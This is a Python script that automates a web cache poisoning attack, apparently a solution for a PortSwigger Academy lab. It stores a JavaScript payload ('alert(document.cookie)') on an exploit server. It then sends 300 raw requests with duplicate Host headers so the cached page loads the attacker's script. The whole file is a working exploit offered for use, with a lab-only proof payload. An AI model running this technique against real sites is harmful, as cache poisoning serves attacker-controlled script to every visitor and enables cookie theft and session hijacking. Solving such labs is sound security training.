import socket
import re
import sys
import requests
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
session = requests.Session()
response = session.get(burp_url, verify=False)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)
burp_data = {
"urlIsHttps": "on", 
"responseFile": "/resources/js/tracking.js", 
"responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", 
"responseBody": "alert(document.cookie)", 
"formAction": "STORE"
}
session.post(exploit_server, data=burp_data, verify=False)
cookies = session.cookies.get_dict()
cookies_header = "; ".join([f"{name}={value}" for name, value in cookies.items()])
host = burp_url[len('https://'):] if burp_url.startswith("https://") else burp_url[len('http://'):]
port = 443
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
request = (f"GET / HTTP/1.1\r\n"
           f"Host: {burp_url[8:]}\r\n"
           f"Host: {exploit_server[8:]}\r\n"
           f"User-Agent: {user_agent}\r\n"
           f"Cookie: {cookies_header}\r\n"
           f"Connection: close\r\n\r\n")

print("Wait 2-5 minutes")
for _ in range(300):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s = ssl.wrap_socket(s)
        s.connect((host, port))
        s.sendall(request.encode())
        response = b""
        while chunk := s.recv(4096):
            response += chunk
